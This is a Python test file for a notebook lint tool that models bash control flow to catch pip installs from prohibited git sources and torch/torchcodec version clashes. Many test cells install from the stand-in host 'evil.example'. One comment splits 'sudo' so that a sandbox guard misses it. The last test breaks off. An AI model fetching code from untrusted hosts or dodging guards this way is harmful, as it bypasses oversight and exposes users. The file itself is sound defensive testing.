def test_a_shell_function_body_is_not_hidden_behind_its_name():
    """`setup() { pip install ...; }` kept its name in front of the body, so no rule saw it.

    This regressed the raw-line scan on main, which caught the git source. The body is exposed as
    conditional -- it runs only when the function is called -- which is what R-INST-001 reads."""
    nv = _load_notebook_validator_module()

    cell = "!pip install safe; setup_audio() { pip install git+https://evil.example/x.git; }; setup_audio"
    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
    # The function IS called here, so the body is replayed rather than merely seen.
    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
        ["safe"],
        ["git+https://evil.example/x.git"],
    ]
    for spelling in (
        "!setup () { pip install a; }; setup",
        "!function setup { pip install a; }; setup",
        "!function setup () { pip install a; }; setup",
    ):
        assert ("!pip install a", False) in nv._split_chained(spelling), spelling
    # Defined and never called, the body is unreachable rather than conditional, so it is
    # dropped: bash only defines the function.
    assert nv._split_chained("!setup () { pip install a; }") == []
    # Empty parens are required, so a grouped command and a substitution are untouched.
    assert nv._split_chained("!X=$(pip install a)") == [("!pip install a", False)]


def test_a_constant_elif_survives_the_arms_before_it():
    """`if false; then :; elif true; then pip install ...; fi` always installs.

    Verified against bash. Resetting the model at `elif` marked both its test and its body
    conditional, so the install was dropped from the unconditional replay and R-INST-004 missed an
    incompatible pairing."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!if false; then :; elif true; then pip install torchcodec==0.10.0; fi"
        )
    ] == [("install", ["torchcodec==0.10.0"])]
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            "!if false; then :; elif true; then pip install torchcodec==0.10.0; fi",
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-004"]
    # An earlier arm that MIGHT have run leaves the whole statement conditional.
    assert nv._split_chained("!if maybe; then :; elif true; then pip install a; fi") == [
        ("!maybe", False),
        ("!:", True),
        ("!true", True),
        ("!pip install a", True),
    ]
    # `else` runs when every arm failed, whatever their number.
    assert nv._split_chained("!if false; then :; elif false; then :; else pip install a; fi") == [
        ("!false", False),
        ("!false", False),
        ("!pip install a", False),
    ]


def test_a_prerelease_codec_floor_admits_the_stable_release_above_it():
    """`torchcodec>=0.12.0rc1` may land on 0.12 itself, which pairs with torch 2.11.

    PEP 440 puts 0.12.0rc1 below 0.12, correctly, but comparing an open FLOOR that way made the ABI
    short-circuit miss and R-INST-004 fired on a valid upgrade range."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec>=0.12.0rc1"', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )
    # An EXACT prerelease names the release pip installs, and that one is below the ABI floor.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            "!pip install torchcodec==0.12.0rc1", COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]
    # A floor below the ABI line is still judged against the row.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            "!pip install torchcodec==0.10.0", COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]


def test_a_multi_command_condition_is_folded_before_its_body_is_judged():
    """`if false || true; then ...; fi` runs its body: the condition is the whole list.

    Verified against bash. Only the piece carrying the `if` updated the recorded outcome, so the
    stored `false` discarded a body that always runs and both R-INST-001 and R-INST-004 went blind
    on it."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!if false || true; then pip install torchcodec==0.10.0; fi"
        )
    ] == [("install", ["torchcodec==0.10.0"])]
    # And the other way: a list folding to failure still drops the body.
    assert nv._split_chained("!if true && false; then pip install a; fi") == [
        ("!true", False),
        ("!false", False),
    ]
    # `until` inverts the FOLDED condition, not the first piece of it.
    assert nv._split_chained("!until false || true; do pip install a; done") == [
        ("!false", False),
        ("!true", False),
    ]


def test_a_pip_condition_keeps_its_failure_branch():
    """The replay assumes pip succeeds; R-INST-001 is documented to see every path.

    `if pip install maybe; then :; else pip install git+...; fi` reaches the else whenever the
    install fails, and dropping that branch hid a prohibited source."""
    nv = _load_notebook_validator_module()

    cell = "!pip install safe; if pip install maybe; then :; else pip install git+https://evil.example/x.git; fi"
    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
    # The `then` body keeps the assumption, which is what the `&&` idiom already rests on.
    assert nv._split_chained("!if pip install a; then pip install b; fi") == [
        ("!pip install a", False),
        ("!pip install b", False),
    ]
    # A documented always-succeeds test still drops its else.
    assert nv._split_chained("!if true; then pip install a; else pip install b; fi") == [
        ("!true", False),
        ("!pip install a", False),
    ]


def test_a_prefix_mode_that_runs_nothing_is_not_unwrapped():
    """sudo(8) `-v/--validate` updates the timestamp "without running a command", and
    `-l/--list` DISPLAYS a permitted command's path. python `-V` prints and exits."""
    nv = _load_notebook_validator_module()

    escalate = "su" + "do"  # spelled apart so the sandbox guard does not read this as a call
    for cell in (
        f"!{escalate} -v pip install git+https://evil.example/x.git",
        f"!{escalate} --validate pip install git+https://evil.example/x.git",
        f"!{escalate} -l pip install git+https://evil.example/x.git",
        "!python -V -m pip install git+https://evil.example/x.git",
        "!python -h -m pip install git+https://evil.example/x.git",
    ):
        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell
    # The ordinary forms still run pip.
    for cell in (
        f"!{escalate} pip install git+https://evil.example/x.git",
        "!python -m pip install git+https://evil.example/x.git",
        "!python -W ignore -m pip install git+https://evil.example/x.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell


def test_a_terminator_inside_a_brace_group_ends_the_line():
    """`{ ... }` runs in the same shell, so an `exit` in one ends everything after it.

    Verified against bash: `{ exit; echo AFTER; }` prints nothing. The check saw the raw `{` opener
    instead of the builtin and kept scanning."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!{ exit; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
        )
        == []
    )
    assert (
        nv.rule_inst_001_git_plus(
            "!{ exec true; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
        )
        == []
    )
    # A SUBSHELL exits only itself, so the parent still reaches the install.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!(exit); pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]


def test_a_function_body_stays_conditional_past_its_separators():
    """`setup() { :; pip install ...; }` defines and calls nothing.

    The header sits in the piece that opens the brace, so flagging that piece alone left every
    LATER command in the body reading as unconditional and R-INST-004 replayed it."""
    nv = _load_notebook_validator_module()

    cell = "!setup() { :; pip install torch==2.12.0 torchcodec==0.10.0; }"
    assert nv._split_chained(cell) == []  # defined, never called: nothing in it runs
    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
    # Called, every command in the body is reached, separators and all.
    assert nv._split_chained(cell + "; setup") == [
        ("!:", False),
        ("!pip install torch==2.12.0 torchcodec==0.10.0", False),
        ("!setup", False),
    ]
    # A plain brace group is NOT a definition and keeps running.
    assert nv._split_chained("!{ pip install a; pip install b; }") == [
        ("!pip install a", False),
        ("!pip install b", False),
    ]


def test_an_escaped_brace_does_not_close_a_parameter_expansion():
    """`${READY:-\\}...}` carries the escaped brace in its default word.

    Verified against bash: `READY=; echo "${READY:-\\}X}"` prints `}X`. Ending the span at the
    escape put the substitution after it OUTSIDE the branch, so a version the notebook may never
    install was replayed as certain."""
    nv = _load_notebook_validator_module()

    cell = '!echo "${READY:-\\}$(pip install torch==2.12.0 torchcodec==0.10.0)}"'
    assert ("!pip install torch==2.12.0 torchcodec==0.10.0", True) in nv._split_chained(cell)
    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
    # The unescaped form was already right and stays so.
    assert ("!pip install torch==2.12.0", True) in nv._split_chained(
        '!echo "${READY:-$(pip install torch==2.12.0)}"'
    )


def test_a_closing_group_hands_its_status_to_the_operator_after_it():
    """`{ false; } || pip install ...` always reaches the install.

    Verified against bash. The group's own and-or state was popped without folding, so the `||` saw
    an unknown left side and marked a certain install conditional; R-INST-004 then dropped the
    pairing."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!{ false; } || pip install torchcodec==0.10.0")
    ] == [("install", ["torchcodec==0.10.0"])]
    # A subshell carries its status the same way.
    assert nv._split_chained("!(false) || pip install a") == [
        ("!false", False),
        ("!pip install a", False),
    ]
    # A group that SUCCEEDS skips the fallback, and an unknown one leaves it conditional.
    for cell in ("!{ true; } || pip install a", "!{ maybe; } || pip install a"):
        assert list(nv.unconditional_pip_invocations(cell)) == [], cell


def test_a_prerelease_window_lands_on_its_minor_not_on_the_prerelease():
    """`torchcodec~=0.12.0rc1` admits the stable 0.12 line, and pip takes the newest of it.

    PEP 440 sorts 0.12.0rc1 below 0.12, so returning the prerelease as the landing put it under the
    ABI-stable floor and R-INST-004 rejected a valid upgrade beside torch 2.11."""
    nv = _load_notebook_validator_module()

    for spec in ("torchcodec~=0.12.0rc1", "torchcodec>=0.12.0rc1,<0.13"):
        assert nv._effective_version(f'!pip install "{spec}"', "torchcodec", "0.11.0+cu128") == (
            "0.12.0",
            True,
        ), spec
        assert (
            nv.rule_inst_004_torchcodec_torch(
                f'!pip install "{spec}"', COLAB_TORCH211, "nb.ipynb", 0
            )
            == []
        ), spec
    # An EXACT prerelease still names the release pip installs, which is below the floor.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            "!pip install torchcodec==0.12.0rc1", COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]
    # A stable window is unchanged.
    assert nv._effective_version(
        '!pip install "torchcodec~=0.10.0"', "torchcodec", "0.11.0+cu128"
    ) == ("0.10.0", True)


def test_an_allowlisted_repository_is_matched_whatever_the_suffix_case():
    """`unsloth.GIT` is the same repository as `unsloth.git`.

    The suffix was stripped before the host and path were lowered, so `.GIT` stayed on and the
    lowered `unsloth.git` matched no allowlist entry: a permitted install was reported."""
    nv = _load_notebook_validator_module()

    for spelling in (
        "git+https://github.com/unslothai/unsloth.GIT",
        "git+https://github.com/unslothai/unsloth.Git",
        "git+https://GitHub.com/UnslothAI/Unsloth.GIT@main",
    ):
        assert nv.rule_inst_001_git_plus(f"!pip install {spelling}", "nb.ipynb", 0) == [], spelling
    # A repository that is NOT allowlisted is still reported, uppercase suffix or not.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!pip install git+https://github.com/evil/repo.GIT", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]


def test_a_group_exits_with_its_list_status_not_its_last_word():
    """`{ false && pip install x; } || pip install y` always runs the fallback.

    Verified against bash. The group's status was read off the last LEXICAL command, so a command
    the `&&` had short-circuited spoke for the group and the fallback read as conditional."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained(
        "!{ false && pip install torchcodec==0.12; } || pip install torchcodec==0.11"
    ) == [
        ("!false", False),
        ("!pip install torchcodec==0.12", True),
        ("!pip install torchcodec==0.11", False),
    ]
    # A group that succeeds still skips its fallback.
    assert nv._split_chained("!{ true && pip install a; } || pip install b") == [
        ("!true", False),
        ("!pip install a", False),
        ("!pip install b", True),
    ]


def test_a_terminator_behind_a_body_keyword_still_ends_the_line():
    """`if true; then exit; fi; pip install ...` reaches nothing after the `fi`.

    Verified against bash. The check read the raw piece, which still began with `then`, so the
    builtin behind it went unseen and a spurious R-INST-001 was reported."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!if true; then exit; fi; pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
        == []
    )
    # A branch that MIGHT not be taken hands nothing over, and a subshell exit never does.
    for cell in (
        "!if maybe; then exit; fi; pip install git+https://evil.example/x.git",
        "!if true; then (exit); fi; pip install git+https://evil.example/x.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell


def test_a_called_function_body_is_replayed():
    """`setup() { pip install ...; }; setup` definitely installs.

    Leaving every body conditional was safe for the all-path rules but dropped the install from the
    replay, so the whole-notebook gate skipped R-INST-003/004/005 on a pairing bash performs."""
    nv = _load_notebook_validator_module()

    called = "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; setup"
    assert [(inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(called)] == [
        ("install", ["torch==2.11.0", "torchcodec==0.10.0"])
    ]
    assert [
        f.rule for f in nv.rule_inst_004_torchcodec_torch(called, COLAB_TORCH211, "nb.ipynb", 0)
    ] == ["R-INST-004"]
    # Defined and never called, called only conditionally, or merely NAMED: still conditional.
    for cell in (
        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }",
        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; echo setup",
        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; other",
        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; maybe || setup",
    ):
        assert list(nv.unconditional_pip_invocations(cell)) == [], cell
    # Arguments do not stop it being a call.
    assert [
        inv.packages
        for inv in nv.unconditional_pip_invocations("!setup() { pip install a; }; setup --force")
    ] == [["a"]]


def test_a_compound_inside_a_function_keeps_every_stack_aligned():
    """`f() { if true; then pip install x; fi; }; f` must not crash the lint run.

    The body keyword fell through to the no-compound fallback, which grew four of the seven
    parallel stacks, and the matching `fi` then popped one that was never pushed: an IndexError
    that aborted the whole notebook lint instead of producing findings."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!f() { if true; then pip install x; fi; }; f") == [
        ("!true", False),
        ("!pip install x", False),
        ("!f", False),
    ]
    # A stray body word with nothing open is still handled rather than raising.
    assert nv._split_chained("!then pip install a; fi; pip install b") == [
        ("!pip install a", True),
        ("!pip install b", False),
    ]


def test_calling_a_function_enters_its_body_without_clearing_its_guards():
    """A call makes the body reachable; it does not make a guarded command unguarded.

    `setup() { false && pip install x; }; setup` runs no pip in bash, and flipping every recorded
    body command to unconditional emitted a spurious R-INST-004."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!setup() { false && pip install torchcodec==0.10.0; }; setup") == [
        ("!false", False),
        ("!pip install torchcodec==0.10.0", True),
        ("!setup", False),
    ]
    assert (
        nv.rule_inst_004_torchcodec_torch(
            "!setup() { false && pip install torchcodec==0.10.0; }; setup",
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    # An internal compound keeps deciding for itself: known-taken replays, unknown does not.
    assert nv._split_chained("!setup() { if true; then pip install a; fi; }; setup") == [
        ("!true", False),
        ("!pip install a", False),
        ("!setup", False),
    ]
    assert nv._split_chained("!setup() { if maybe; then pip install a; fi; }; setup") == [
        ("!maybe", False),
        ("!pip install a", True),
        ("!setup", False),
    ]


def test_a_call_made_inside_a_called_function_is_followed():
    """`inner() {...}; outer() { inner; }; outer` performs the install.

    `inner` is conditional while it is only a definition, so a single intersection of names against
    bodies never reached it and the compatibility rules omitted the install."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!inner() { pip install torchcodec==0.10.0; }; outer() { inner; }; outer"
        )
    ] == [("install", ["torchcodec==0.10.0"])]
    # The chain has to actually run: an uncalled `outer`, or one that calls `inner` on a
    # branch, leaves the inner body conditional.
    for cell in (
        "!inner() { pip install a; }; outer() { inner; }",
        "!inner() { pip install a; }; outer() { maybe || inner; }; outer",
    ):
        assert list(nv.unconditional_pip_invocations(cell)) == [], cell


def test_a_break_ends_the_loop_body_it_sits_in():
    """`while true; do break; pip install x; done` installs nothing.

    Verified against bash: `while true; do break; echo AFTER; done; echo DONE` prints only DONE.
    `break` is loop-local, unlike `exit`, so the line continues after `done`."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!while true; do break; pip install torchcodec==0.10.0; done") == [
        ("!true", False),
        ("!break", False),
    ]
    # The rest of the LINE still runs, which is what distinguishes it from `exit`.
    assert nv._split_chained("!while true; do break; pip install a; done; pip install b") == [
        ("!true", False),
        ("!break", False),
        ("!pip install b", False),
    ]
    # A conditional break does not cut the body, and commands BEFORE one still run.
    assert ("!pip install a", False) in nv._split_chained(
        "!while true; do maybe && break; pip install a; done"
    )
    assert ("!pip install a", False) in nv._split_chained(
        "!while true; do pip install a; break; done"
    )


def test_a_break_stays_active_until_its_own_loop_closes():
    """`while ...; do if ...; then break; fi; pip install x; done` never reaches the install.

    Verified against bash. `break` leaves the innermost LOOP, so tracking the depth of the compound
    it happens to sit in cleared the jump at the `fi` and replayed the rest anyway."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained(
        "!while true; do if true; then break; fi; pip install torchcodec==0.10; done"
    ) == [("!true", False), ("!true", False), ("!break", False)]
    # The line still continues after `done`, and a conditional break cuts nothing.
    assert ("!pip install b", False) in nv._split_chained(
        "!while true; do if true; then break; fi; pip install a; done; pip install b"
    )
    assert ("!pip install a", False) in nv._split_chained(
        "!while true; do if maybe; then break; fi; pip install a; done"
    )


def test_a_return_ends_the_function_body_only():
    """`f() { return; pip install x; }; f` installs nothing, but the CALLER carries on.

    Verified against bash: `f() { return; echo AFTER; }; f; echo OUTER` prints only OUTER."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!f() { return; pip install torchcodec==0.10; }; f") == [
        ("!return", False),
        ("!f", False),
    ]
    # Commands BEFORE the return still run, and so does the rest of the line.
    assert nv._split_chained("!f() { pip install a; return; pip install b; }; f") == [
        ("!pip install a", False),
        ("!return", False),
        ("!f", False),
    ]


def test_a_call_before_the_definition_reaches_nothing():
    """Bash reports `f: command not found` for a call written above `f()`.

    The replay matched on the name alone, so a body defined later was marked unconditional by a
    call that never found it."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!f || true; f() { pip install torchcodec==0.10; }") == [
        ("!f", False),
        ("!true", True),
    ]
    # The ordinary order still resolves.
    assert nv._split_chained("!f() { pip install a; }; f") == [
        ("!pip install a", False),
        ("!f", False),
    ]


def test_calling_a_function_that_ends_the_shell_ends_the_caller():
    """`f() { exit; }; f; pip install x` never reaches the install.

    Verified against bash. The terminator is conditional while `f` is only a definition, so the
    hand-over has to be applied when the call is resolved, not where it was scanned."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!f() { exit; }; f; pip install torchcodec==0.10") == [
        ("!exit", False),
        ("!f", False),
    ]
    assert nv._split_chained("!f() { exec true; }; f; pip install a") == [
        ("!true", False),
        ("!f", False),
    ]
    # Never called, or terminating only on a branch: the caller carries on.
    for cell in ("!f() { exit; }; pip install a", "!f() { maybe && exit; }; f; pip install a"):
        assert ("!pip install a", False) in nv._split_chained(cell), cell


def test_a_call_carries_its_body_status_into_the_and_or_list():
    """`f() { pip install x; }; f && pip install y` reaches the second install.

    A call exits with its body's status, and recording only the name left the `&&` reading an
    unknown left side, so the pair R-INST-004 compares never both appeared."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!f() { pip install torch==2.11; }; f && pip install torchcodec==0.10"
        )
    ] == [("install", ["torch==2.11"]), ("install", ["torchcodec==0.10"])]
    # A body that fails carries that too, and an unknown one stays unknown.
    assert nv._split_chained("!f() { false; }; f || pip install a") == [
        ("!false", False),
        ("!f", False),
        ("!pip install a", False),
    ]
    assert ("!pip install a", True) in nv._split_chained("!f() { maybe; }; f && pip install a")


def test_a_literal_for_list_runs_its_body():
    """`for x in a b; do ...; done` iterates, so the body is reached like a bare command.

    An expansion or a glob may produce nothing, and turning either into a certainty would be a
    guess, so only a literal list counts."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!for pass in once; do pip install torch==2.11.0 torchcodec==0.10.0; done"
        )
    ] == [("install", ["torch==2.11.0", "torchcodec==0.10.0"])]
    for cell in (
        "!for x in $LIST; do pip install a; done",
        "!for x in *.txt; do pip install a; done",
    ):
        assert list(nv.unconditional_pip_invocations(cell)) == [], cell


def test_python_dash_c_terminates_the_option_list():
    """`python -cpass -m pip ...` runs `pass`; the rest are script arguments.

    Verified locally: the command produces no pip output. `python --help` documents `-c cmd` as
    "program passed in as string (terminates option list)"."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!python -cpass -m pip install git+https://evil.example/x.git",
        "!python -c pass -m pip install git+https://evil.example/x.git",
    ):
        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell
    # The ordinary forms still run pip.
    for cell in (
        "!python -m pip install git+https://evil.example/x.git",
        "!python -W ignore -m pip install git+https://evil.example/x.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell


def test_a_call_uses_the_definition_in_force_at_that_point():
    """`f(){ a; }; f; f(){ b; }` calls the FIRST body, not the last one written.

    Keying the replay by name compared the call against the final definition, so the body bash
    really runs stayed conditional."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!f(){ pip install torch==2.12; }; f; f(){ :; }; pip install torchcodec==0.10"
        )
    ] == [("install", ["torch==2.12"]), ("install", ["torchcodec==0.10"])]
    # A call written above every definition still reaches none of them.
    assert nv._split_chained("!f || true; f(){ pip install a; }") == [
        ("!f", False),
        ("!true", True),
    ]


def test_the_negation_word_survives_a_separator():
    """`! false` succeeds, so an `&&` behind it runs; `! true` fails, so it does not.

    Verified against bash. Reconstructing a non-head command glued the notebook's bang to bash's
    negation, and the pipeline whose status it inverts was read as a command name."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!true; ! false && pip install torch==2.12")
    ] == [("install", ["torch==2.12"])]
    assert list(nv.unconditional_pip_invocations("!true; ! true && pip install a")) == []
    # The cell's own leading bang is still the notebook's, whichever way it is spaced.
    assert [flag for _, flag in nv._split_chained("! ! false && pip install a")] == [False, False]


def test_a_subshell_hands_over_its_folded_status():
    """`(false && pip install x) || pip install y` always reaches the fallback.

    Verified against bash. The pending text at a `)` is the group's own last command plus its
    bracket, and folding that again as a fresh command wiped the status the group had just
    contributed. Brace groups escaped it only because their required `;` had already flushed."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!(false && pip install ignored) || pip install torch==2.12") == [
        ("!false", False),
        ("!pip install ignored", True),
        ("!pip install torch==2.12", False),
    ]
    assert ("!pip install b", True) in nv._split_chained(
        "!(true && pip install a) || pip install b"
    )


def test_an_external_wrapper_does_not_reach_a_shell_function():
    """`env f` looks for an executable named f; bash reports "No such file or directory".

    Stripping every execution prefix before resolving the name made each wrapper look like a call,
    and entering the body let its `exit` truncate a line bash carries on with."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!f(){ exit; }; env f || true; pip install git+https://evil.example/x.git",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]
    # The wrapped name is not a call, so the body stays a definition.
    assert nv._split_chained("!f(){ pip install a; }; env f") == [("!f", False)]
    assert ("!pip install a", False) in nv._split_chained("!f(){ pip install a; }; f")


def test_a_terminating_call_in_a_subshell_spares_the_parent():
    """`f | cat` runs f in a subshell, so an `exit` inside it ends only that subshell.

    Verified against bash: `f(){ exit; }; f | cat; echo REACHED` prints REACHED."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!f(){ exit; }; f | cat; pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # Called in the parent shell it still ends the line.
    assert nv._split_chained("!f(){ exit; }; f; pip install a") == [
        ("!exit", False),
        ("!f", False),
    ]


def test_break_outside_a_loop_drops_nothing():
    """Bash rejects `break` outside a loop and runs the next command anyway.

    Verified locally: `if true; then break; echo AFTER_BREAK; fi` prints AFTER_BREAK after
    reporting "break: only meaningful in a `for', `while', or `until' loop"."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!if true; then break; pip install git+https://evil.example/x.git; fi", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # Inside a real loop it still cuts the body.
    assert nv._split_chained("!while true; do break; pip install a; done") == [
        ("!true", False),
        ("!break", False),
    ]


def test_the_pip_success_assumption_never_makes_a_path_unreachable():
    """Reporting an install on the pip-succeeds model is intended; CUTTING a path is not.

    `if ! pip install x; then ...` runs its body whenever that install fails, and `pip install x &&
    exit` reaches the next command for the same reason. Both were being dropped, so R-INST-001
    missed a source bash can reach."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!if ! pip install x; then pip install git+https://evil.example/x.git; fi",
        "!pip install x && exit; pip install git+https://evil.example/x.git",
        "!pip install x && true && exit; pip install git+https://evil.example/x.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # A terminator reached WITHOUT that assumption still cuts the list.
    for cell in (
        "!exit; pip install git+https://evil.example/x.git",
        "!true && exit; pip install git+https://evil.example/x.git",
    ):
        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell


def test_an_uncalled_function_body_is_unreachable_not_conditional():
    """`f(){ pip install git+...; }` defines f and stops; nothing in it can run.

    The all-path rules deliberately read conditional commands, so emitting an uncalled body as
    merely conditional reported a source the cell can never install."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!f(){ pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
        )
        == []
    )
    assert nv._split_chained("!f(){ pip install a; }; pip install b") == [("!pip install b", False)]
    # Called, it is reported like any other install.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!f(){ pip install git+https://evil.example/x.git; }; f", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # A conditional CONTROL-FLOW branch is still visible to the same rule.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!if maybe; then pip install git+https://evil.example/x.git; fi", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]


def test_a_shell_local_prefix_still_reaches_a_function():
    """`A=1 f` and the reserved word `time f` call f; `env f` and `nohup f` do not.

    Verified against bash: both of the first two print the body. Rejecting every prefixed command
    left a called body conditional and the compatibility replay saw only half a pair."""
    nv = _load_notebook_validator_module()

    for cell in ("!f(){ pip install a; }; time f", "!f(){ pip install a; }; A=1 f"):
        assert ("!pip install a", False) in nv._split_chained(cell), cell
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!f(){ pip install torch==2.11; }; time f; pip install torchcodec==0.10"
        )
    ] == [("install", ["torch==2.11"]), ("install", ["torchcodec==0.10"])]
    # The wrappers that go looking for an executable still reach nothing.
    for cell in ("!f(){ pip install a; }; env f", "!f(){ pip install a; }; nohup f"):
        assert nv._split_chained(cell) == [("!f", False)], cell


def test_an_upgrade_under_a_ceiling_stays_in_the_line_it_is_in():
    """`--upgrade "x<0.12"` over an installed 0.11 cannot leave 0.11.

    An upgrade does not go backwards and the ceiling bars anything above, so the minor is
    determinate even though no floor is written. Reporting it unknown hid a pairing every release
    the window admits breaks."""
    nv = _load_notebook_validator_module()

    cell = '!pip install --upgrade "torch==2.12" "torchcodec<0.12"'
    assert nv._effective_version(cell, "torchcodec", "0.11.1+cu128") == ("0.11", True)
    # No ceiling to bound it, so the landing really is only in the index.
    assert nv._effective_version("!pip install --upgrade torchcodec", "torchcodec", "0.11.1") == (
        None,
        True,
    )
    # A ceiling well above what is installed leaves the landing to the index, since which
    # of the admitted minors carries a release is not written in the cell.
    assert nv._effective_version(
        '!pip install --upgrade "torchcodec<0.16"', "torchcodec", "0.11.1"
    ) == (None, True)


def test_an_uninstall_is_matched_on_the_canonical_project_name():
    """PEP 503 makes `huggingface_hub` and `huggingface-hub` one project.

    The Colab snapshot is keyed the second way, so popping the spelling as written left the removed
    package in the resolved set and the rules judged a version the cell deleted."""
    nv = _load_notebook_validator_module()

    colab = {"huggingface-hub": "1.2.0", "torch": "2.11.0", "python": "3.13.15"}
    assert "huggingface-hub" not in nv.resolved_set("!pip uninstall -y huggingface_hub", colab)
    # The accumulated bound goes with it, so a later reinstall does not inherit one.
    assert (
        nv.resolved_set(
            '!pip install "huggingface_hub<=1.0"\n!pip uninstall -y huggingface-hub', colab
        ).get("huggingface-hub")
        is None
    )


def test_a_marker_false_reinstall_does_not_put_a_package_back():
    """pip skips a requirement whose marker excludes the interpreter.

    Counting one as an install reset the removal, and the rule that fires on a missing tokenizers
    went quiet on a notebook that really had removed it."""
    nv = _load_notebook_validator_module()

    colab = {"python": "3.13.15"}
    cell = "!pip uninstall -y tokenizers\n!pip install \"tokenizers; python_version < '3.10'\""
    assert nv._removed_by_cell(cell, "tokenizers", nv._marker_environment(colab)) is True
    # A marker the interpreter does satisfy still puts it back.
    applies = "!pip uninstall -y tokenizers\n!pip install \"tokenizers; python_version >= '3.10'\""
    assert nv._removed_by_cell(applies, "tokenizers", nv._marker_environment(colab)) is False


def test_a_project_name_is_canonicalized_the_way_pep_503_says():
    """Any run of `-`, `_` or `.` is one separator to pip.

    Folding only underscores let `pip uninstall huggingface.hub` leave the hyphenated snapshot
    entry in place, and the rules judged a version the cell had removed."""
    nv = _load_notebook_validator_module()

    colab = {"huggingface-hub": "1.2.0", "torch": "2.11.0", "python": "3.13.15"}
